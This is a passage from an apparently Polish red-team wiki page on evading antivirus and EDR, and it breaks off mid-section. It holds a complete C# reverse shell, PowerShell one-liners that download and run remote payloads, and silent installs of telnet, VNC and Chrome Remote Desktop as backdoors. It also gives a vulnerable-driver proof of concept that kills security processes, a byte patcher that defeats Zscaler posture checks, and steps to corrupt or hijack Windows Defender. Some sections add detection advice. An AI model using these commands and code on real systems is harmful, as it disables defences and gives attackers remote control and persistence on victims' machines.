<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) to potężny mechanizm logowania w Windows, który pozwala aplikacjom i komponentom systemowym **logować zdarzenia**. Jednakże może być on także wykorzystywany przez produkty bezpieczeństwa do monitorowania i wykrywania złośliwych działań.

Podobnie jak w przypadku omijania AMSI, możliwe jest również sprawienie, by funkcja **`EtwEventWrite`** procesu przestrzeni użytkownika zwracała się natychmiast bez logowania jakichkolwiek zdarzeń. Robi się to przez patchowanie funkcji w pamięci tak, aby natychmiast zwracała, efektywnie wyłączając logowanie ETW dla tego procesu.

Więcej informacji znajdziesz w **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Ładowanie binarek C# do pamięci jest znane od dłuższego czasu i wciąż jest świetnym sposobem uruchamiania narzędzi post-exploitation bez wykrycia przez AV.

Ponieważ payload zostanie załadowany bezpośrednio do pamięci bez zapisu na dysk, musimy się martwić jedynie o patchowanie AMSI dla całego procesu.

Większość frameworków C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) już oferuje możliwość wykonywania C# assemblies bezpośrednio w pamięci, ale istnieją różne sposoby, by to zrobić:

- **Fork\&Run**

Polega na **utworzeniu nowego procesu ofiary**, wstrzyknięciu do tego procesu złośliwego kodu post-exploitation, wykonaniu go, a po zakończeniu zabiciu nowego procesu. Ma to zarówno zalety, jak i wady. Zaletą metody fork and run jest to, że wykonanie odbywa się **poza** naszym procesem implantatu Beacon. Oznacza to, że jeśli coś pójdzie nie tak w naszym działaniu post-exploitation lub zostanie wykryte, istnieje **znacznie większa szansa**, że nasz **implant przetrwa.** Wadą jest to, że mamy **większe prawdopodobieństwo** wykrycia przez **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Chodzi o wstrzyknięcie złośliwego kodu post-exploitation **do własnego procesu**. W ten sposób możesz uniknąć tworzenia nowego procesu i jego skanowania przez AV, ale wadą jest to, że jeśli coś pójdzie nie tak podczas wykonania payloadu, istnieje **znacznie większa szansa** na **utracenie beacona**, ponieważ proces może ulec awarii.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Jeśli chcesz dowiedzieć się więcej o ładowaniu C# Assembly, sprawdź ten artykuł [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) oraz ich InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Możesz także ładować C# Assemblies **z PowerShell**, zobacz [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) oraz [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Jak zaproponowano w [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), możliwe jest uruchamianie złośliwego kodu przy użyciu innych języków, dając skompromitowanej maszynie dostęp **do środowiska interpretera zainstalowanego na udziale SMB kontrolowanym przez atakującego**.

Zezwalając na dostęp do binariów interpretera i środowiska na udziale SMB, możesz **wykonywać dowolny kod w tych językach w pamięci** skompromitowanej maszyny.

Repozytorium wskazuje: Defender nadal skanuje skrypty, ale wykorzystując Go, Java, PHP itd., mamy **więcej elastyczności w omijaniu statycznych sygnatur**. Testy z losowymi, nieobfuskowanymi reverse shell skryptami w tych językach okazały się skuteczne.

## TokenStomping

Token stomping to technika pozwalająca atakującemu na **manipulowanie access token lub produktu bezpieczeństwa takiego jak EDR lub AV**, pozwalając obniżyć jego uprawnienia tak, że proces nie umrze, ale nie będzie miał uprawnień do sprawdzania złośliwych aktywności.

Aby temu zapobiec, Windows mógłby **zabronić zewnętrznym procesom** uzyskiwania uchwytów do tokenów procesów bezpieczeństwa.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Jak opisano w [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), łatwo jest zainstalować Chrome Remote Desktop na komputerze ofiary, a następnie użyć go do przejęcia i utrzymania dostępu:
1. Pobierz ze strony https://remotedesktop.google.com/, kliknij "Set up via SSH", a następnie kliknij plik MSI dla Windows, aby pobrać instalator MSI.
2. Uruchom instalator cicho na maszynie ofiary (wymagane uprawnienia administratora): `msiexec /i chromeremotedesktophost.msi /qn`
3. Wróć do strony Chrome Remote Desktop i kliknij dalej. Kreator poprosi o autoryzację; kliknij przycisk Authorize, aby kontynuować.
4. Uruchom podany parametr z pewnymi modyfikacjami: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Uwaga: parametr pin pozwala ustawić pin bez użycia GUI).

## Advanced Evasion

Evasion to bardzo skomplikowany temat — czasami trzeba uwzględnić wiele różnych źródeł telemetrii w jednym systemie, więc praktycznie niemożliwe jest pozostanie całkowicie niezauważonym w dojrzałych środowiskach.

Każde środowisko, przeciwko któremu działasz, będzie miało swoje mocne i słabe strony.

Gorąco zachęcam do obejrzenia tego wystąpienia od [@ATTL4S](https://twitter.com/DaniLJ94), aby uzyskać wgląd w bardziej zaawansowane techniki Evasion.

{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

To także inne świetne wystąpienie od [@mariuszbit](https://twitter.com/mariuszbit) o Evasion in Depth.

{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Możesz użyć [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), który będzie **usuwać części binarki** aż **dowiedzie się, którą część Defender** uznaje za złośliwą i rozdzieli ją dla Ciebie.\
Innym narzędziem robiącym **to samo jest** [**avred**](https://github.com/dobin/avred) z otwartą usługą web dostępną pod adresem [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do Windows10 wszystkie wersje Windows zawierały **Telnet server**, który można było zainstalować (jako administrator) wykonując:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Spraw, aby się uruchamiał przy **starcie** systemu i **uruchom** go teraz:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Zmień port telnet** (stealth) i wyłącz firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Pobierz z: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (chcesz binarne downloady, nie setup)

**ON THE HOST**: Uruchom _**winvnc.exe**_ i skonfiguruj serwer:

- Włącz opcję _Disable TrayIcon_
- Ustaw hasło w _VNC Password_
- Ustaw hasło w _View-Only Password_

Następnie przenieś binarkę _**winvnc.exe**_ i **nowo** utworzony plik _**UltraVNC.ini**_ na maszynę **victim**

#### **Reverse connection**

attacker powinien na swoim host uruchomić binarkę `vncviewer.exe -listen 5900`, aby była przygotowana do przechwycenia reverse VNC connection. Następnie, wewnątrz **victim**: uruchom demona winvnc `winvnc.exe -run` i wykonaj `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**UWAGA:** Aby zachować stealth, nie należy robić kilku rzeczy

- Nie uruchamiaj `winvnc` jeśli już działa lub wywołasz [popup](https://i.imgur.com/1SROTTl.png). Sprawdź, czy działa poleceniem `tasklist | findstr winvnc`
- Nie uruchamiaj `winvnc` bez `UltraVNC.ini` w tym samym katalogu, bo spowoduje to otwarcie [the config window](https://i.imgur.com/rfMQWcf.png)
- Nie uruchamiaj `winvnc -h` w celu pomocy bo wywoła to [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pobierz z: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Wewnątrz GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Teraz **uruchom lister** za pomocą `msfconsole -r file.rc` i **wykonaj** **xml payload** za pomocą:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Obecny Defender zakończy proces bardzo szybko.**

### Kompilowanie własnego reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Pierwszy C# Revershell

Skompiluj go za pomocą:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Użyj tego z:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# używając kompilatora
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatyczne pobieranie i uruchamianie:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista obfuskatorów C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Przykład użycia Pythona do tworzenia injectorów:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Inne narzędzia
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Więcej

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 wykorzystał małe narzędzie konsolowe znane jako **Antivirus Terminator**, aby wyłączyć zabezpieczenia endpoint przed wdrożeniem ransomware. Narzędzie dostarcza swój **własny podatny, ale *signed* driver** i nadużywa go do wydawania uprzywilejowanych operacji w kernelu, których nawet usługi AV działające jako Protected-Process-Light (PPL) nie mogą zablokować.

Kluczowe wnioski
1. **Signed driver**: Plik zapisany na dysku to `ServiceMouse.sys`, ale binarka to legalnie podpisany driver `AToolsKrnl64.sys` z “System In-Depth Analysis Toolkit” firmy Antiy Labs. Ponieważ driver ma ważny podpis Microsoft, ładuje się nawet gdy Driver-Signature-Enforcement (DSE) jest włączone.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Pierwsza linia rejestruje driver jako **kernel service**, a druga go uruchamia, dzięki czemu `\\.\ServiceMouse` staje się dostępny z poziomu user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Funkcja                                  |
|-----------:|-----------------------------------------|
| `0x99000050` | Zakończ dowolny proces po PID (używane do zabijania usług Defender/EDR) |
| `0x990000D0` | Usuń dowolny plik z dysku |
| `0x990001D0` | Wyładuj driver i usuń usługę |

Minimalny proof-of-concept w C:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Dlaczego to działa**: BYOVD pomija całkowicie ochrony w user-mode; kod wykonywany w kernelu może otwierać *protected* procesy, kończyć je lub manipulować obiektami jądra niezależnie od PPL/PP, ELAM czy innych mechanizmów utwardzających.

Detection / Mitigation
•  Włącz listę zablokowanych podatnych sterowników Microsoft (`HVCI`, `Smart App Control`), aby Windows odrzucał ładowanie `AToolsKrnl64.sys`.  
•  Monitoruj tworzenie nowych *kernel* services i generuj alerty, gdy driver jest ładowany z katalogu zapisywalnego przez wszystkich (world-writable) lub nie znajduje się na allow-list.  
•  Obserwuj uchwyty w user-mode do niestandardowych device objectów, po których następują podejrzane wywołania `DeviceIoControl`.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** stosuje zasady oceny stanu urządzenia lokalnie i korzysta z Windows RPC do przekazywania wyników innym komponentom. Dwie słabe decyzje projektowe umożliwiają pełne obejście:

1. Ocena postawy odbywa się **w całości po stronie klienta** (na serwer wysyłana jest tylko wartość boolowska).  
2. Wewnętrzne endpointy RPC jedynie sprawdzają, czy łączący się plik wykonywalny jest **signed by Zscaler** (przy użyciu `WinVerifyTrust`).

Poprzez **patching czterech signed binaries na dysku** oba mechanizmy można zneutralizować:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Zawsze zwraca `1`, więc każda kontrola uznawana jest za zgodną |
| `ZSAService.exe` | Pośrednie wywołanie do `WinVerifyTrust` | NOP-ed ⇒ każdy (nawet unsigned) proces może podpiąć się do RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zastąpione przez `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Omijane |

Minimalny fragment patchera:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Po zastąpieniu oryginalnych plików i ponownym uruchomieniu stosu usług:

* **Wszystkie** kontrole postawy są **zielone/zgodne**.
* Niepodpisane lub zmodyfikowane binaria mogą otwierać punkty końcowe RPC na nazwanych potokach (np. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Skompromitowany host uzyskuje nieograniczony dostęp do sieci wewnętrznej zdefiniowanej przez polityki Zscaler.

To studium przypadku pokazuje, jak czysto klienckie decyzje zaufania i proste sprawdzenia podpisu można obejść kilkoma łatkami bajtowymi.

## Wykorzystywanie Protected Process Light (PPL) do manipulacji AV/EDR za pomocą LOLBINs

Protected Process Light (PPL) wymusza hierarchię podpisującego/poziomu, tak że tylko procesy chronione o równym lub wyższym poziomie mogą modyfikować się nawzajem. Ofensywnie — jeśli możesz legalnie uruchomić binarkę z obsługą PPL i kontrolować jej argumenty, możesz przekształcić nieszkodliwą funkcjonalność (np. logowanie) w ograniczony, oparty na PPL prymityw zapisu przeciwko chronionym katalogom używanym przez AV/EDR.

Co sprawia, że proces uruchamia się jako PPL
- Docelowy EXE (i załadowane DLL) musi być podpisany z EKU obsługującym PPL.
- Proces musi być stworzony przy pomocy CreateProcess z flagami: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Należy zażądać zgodnego poziomu ochrony odpowiadającego podpisującemu binarkę (np. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` dla podpisujących anty-malware, `PROTECTION_LEVEL_WINDOWS` dla podpisujących Windows). Nieprawidłowe poziomy spowodują błąd przy tworzeniu.

Zobacz także szersze wprowadzenie do PP/PPL i ochrony LSASS tutaj:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Narzędzia uruchamiające
- Narzędzie open-source: CreateProcessAsPPL (wybiera poziom ochrony i przekazuje argumenty do docelowego EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Wzorzec użycia:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN prymityw: ClipUp.exe
- Podpisany plik systemowy `C:\Windows\System32\ClipUp.exe` uruchamia sam siebie i przyjmuje parametr pozwalający zapisać plik dziennika na ścieżce określonej przez wywołującego.
- Gdy uruchomiony jako proces PPL, zapis pliku odbywa się z ochroną PPL.
- ClipUp nie potrafi parsować ścieżek zawierających spacje; użyj 8.3 short paths, aby wskazać zwykle chronione lokalizacje.

8.3 short path helpers
- List short names: `dir /x` in each parent directory.
- Derive short path in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Uruchom PPL-capable LOLBIN (ClipUp) z `CREATE_PROTECTED_PROCESS` używając launchera (np. CreateProcessAsPPL).
2) Przekaż argument ścieżki logu ClipUp, aby wymusić utworzenie pliku w chronionym katalogu AV (np. Defender Platform). Użyj krótkich nazw 8.3, jeśli to konieczne.
3) Jeśli docelowy binarny plik jest zwykle otwarty/zablokowany przez AV podczas działania (np. MsMpEng.exe), zaplanuj zapis przy starcie systemu przed uruchomieniem AV, instalując usługę auto-start, która pewnie uruchomi się wcześniej. Zweryfikuj kolejność bootowania za pomocą Process Monitor (boot logging).
4) Po rebootcie zapis z ochroną PPL następuje przed zablokowaniem binarek przez AV, uszkadzając docelowy plik i uniemożliwiając jego uruchomienie.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Uwagi i ograniczenia
- Nie możesz kontrolować treści, które ClipUp zapisuje poza ich umiejscowieniem; ten mechanizm nadaje się bardziej do korupcji niż do precyzyjnego wstrzykiwania zawartości.
- Wymaga uprawnień lokalnego administratora/SYSTEM do instalacji/uruchomienia usługi oraz okna na reboot.
- Czasowanie jest krytyczne: cel nie może być otwarty; wykonanie podczas uruchamiania systemu unika blokad plików.

Detekcje
- Tworzenie procesu `ClipUp.exe` z nietypowymi argumentami, szczególnie jeśli uruchamiany przez niestandardowe launchery, w okolicach uruchamiania systemu.
- Nowe usługi skonfigurowane do autostartu podejrzanych binarek i uruchamiające się stale przed Defender/AV. Zbadaj tworzenie/modyfikację usług przed wystąpieniem błędów startu Defender.
- Monitorowanie integralności plików w katalogach binarek Defender/Platform; nieoczekiwane tworzenie/modyfikacje plików przez procesy z flagami protected-process.
- Telemetria ETW/EDR: szukaj procesów tworzonych z `CREATE_PROTECTED_PROCESS` oraz anomalnego użycia poziomów PPL przez binarki niebędące AV.

Środki zaradcze
- WDAC/Code Integrity: ogranicz, które podpisane binarki mogą działać jako PPL i pod jakimi parentami; zablokuj wywołania ClipUp poza dozwolonymi kontekstami.
- Higiena usług: ogranicz tworzenie/modyfikację usług autostartu i monitoruj manipulacje kolejnością startu.
- Upewnij się, że tamper protection Defender oraz mechanizmy early-launch są włączone; zbadaj błędy startu wskazujące na korupcję binarek.
- Rozważ wyłączenie generowania krótkich nazw 8.3 na woluminach, które hostują narzędzia zabezpieczające, jeśli jest to zgodne ze środowiskiem (dokładnie przetestuj).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender chooses the platform it runs from by enumerating subfolders under:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

It selects the subfolder with the highest lexicographic version string (e.g., `4.18.25070.5-0`), then starts the Defender service processes from there (updating service/registry paths accordingly). This selection trusts directory entries including directory reparse points (symlinks). An administrator can leverage this to redirect Defender to an attacker-writable path and achieve DLL sideloading or service disruption.

Preconditions
- Local Administrator (needed to create directories/symlinks under the Platform folder)
- Ability to reboot or trigger Defender platform re-selection (service restart on boot)
- Only built-in tools required (mklink)

Why it works
- Defender blocks writes in its own folders, but its platform selection trusts directory entries and picks the lexicographically highest version without validating that the target resolves to a protected/trusted path.

Step-by-step (example)
1) Przygotuj zapisywalną kopię bieżącego folderu platformy, np. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Utwórz symlink katalogu o wyższej wersji wewnątrz Platform wskazujący na twój folder:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Wybór wyzwalacza (zalecany restart):
```cmd
shutdown /r /t 0
```
4) Zweryfikuj, że MsMpEng.exe (WinDefend) uruchamia się z przekierowanej ścieżki:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Powinieneś zaobserwować nową ścieżkę procesu pod `C:\TMP\AV\` oraz konfigurację usługi/rejestru odzwierciedlającą tę lokalizację.

Post-exploitation options
- DLL sideloading/code execution: Drop/replace DLLs, które Defender ładuje z katalogu aplikacji, aby wykonać kod w procesach Defendera. Zobacz sekcję powyżej: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Usuń version-symlink, tak aby przy następnym uruchomieniu skonfigurowana ścieżka nie była rozwiązywana i Defender nie uruchomił się:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Zauważ, że ta technika sama w sobie nie zapewnia eskalacji uprawnień; wymaga uprawnień administratora.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Zespoły Red Team mogą przenieść runtime evasion z implantu C2 do samego modułu celu poprzez hookowanie jego Import Address Table (IAT) i kierowanie wybranych API przez kontrolowany przez atakującego, position‑independent code (PIC). To uogólnia unikanie wykrycia poza wąskim surface API, które udostępniają wiele kitów (np. CreateProcessA), i rozszerza te same zabezpieczenia na BOFs i post‑exploitation DLLs.

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
  - Memory mask/unmask around the call (e.g., encrypt Beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
  - Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis resolves to expected frames.
- For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Dlaczego IAT hooking tutaj
- Działa dla dowolnego kodu, który używa hookowanego importu, bez modyfikowania kodu narzędzia czy polegania na Beacon jako proxy dla konkretnych API.
- Obejmuje post‑ex DLLs: hookowanie LoadLibrary* pozwala przechwycić ładowanie modułów (np. System.Management.Automation.dll, clr.dll) i zastosować to samo maskowanie/omijanie stosu do ich wywołań API.
- Przywraca niezawodne użycie poleceń spawnujących procesy po eksploatacji wobec detekcji opartych na analizie stosu, poprzez opakowanie CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notatki
- Zastosuj patch po relokacjach/ASLR i przed pierwszym użyciem importu. Reflective loaders like TitanLdr/AceLdr wykazują hooking podczas DllMain ładowanego modułu.
- Trzymaj wrappery małe i PIC-safe; uzyskaj prawdziwe API przez oryginalną wartość IAT, którą przechwyciłeś przed patchowaniem, albo przez LdrGetProcedureAddress.
- Używaj przejść RW → RX dla PIC i unikaj pozostawiania stron writable+executable.

Call‑stack spoofing stub
